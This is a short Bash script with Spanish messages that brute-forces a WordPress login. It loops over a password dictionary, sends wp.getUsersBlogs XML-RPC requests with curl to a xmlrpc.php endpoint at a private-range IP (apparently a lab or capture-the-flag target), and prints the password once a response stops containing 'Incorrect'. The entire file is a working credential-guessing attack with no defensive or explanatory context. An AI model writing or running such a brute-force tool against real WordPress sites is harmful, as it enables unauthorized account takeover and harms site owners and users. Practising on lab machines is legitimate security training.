#!/bin/bash

clear

function ctrl_c(){
	echo -e "\n[*] Saliendo..."
	tput cnorm; exit 1
}

trap ctrl_c INT

tput civis

declare -r usuario="sysadmin"
declare -r path_diccionario="../content/dictionary.txt"
declare -r file_xml="data.xml"
declare -r xmlrpc_url="http://10.10.139.137/xmlrpc.php"
declare -r palabra_error="Incorrect"


function erase_data(){
    rm $file_xml
}

echo -e "\n[+] Ejecutando Fuerza Bruta contra el activo Wordpress $xmlrpc_url"
echo -e "\n[+] Utilizando el diccionario \"$path_diccionario\" contra el usuario \"$usuario\""
echo -e "\n[!] Esto podría tomar algunos minutos..."

for password in $(cat $path_diccionario); do

cat << EOF > $file_xml
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <param><value>$usuario</value></param>
    <param><value>$password</value></param>
</methodCall>
EOF

    curl -s -X POST "$xmlrpc_url" --data @$file_xml | grep -i "$palabra_error" &>/dev/null

    if [ "$(echo $?)" != 0 ]; then
        echo -e "\n[+] La contraseña correcta es: $password"
        tput cnorm; exit 0
    fi

    erase_data

done

tput cnorm
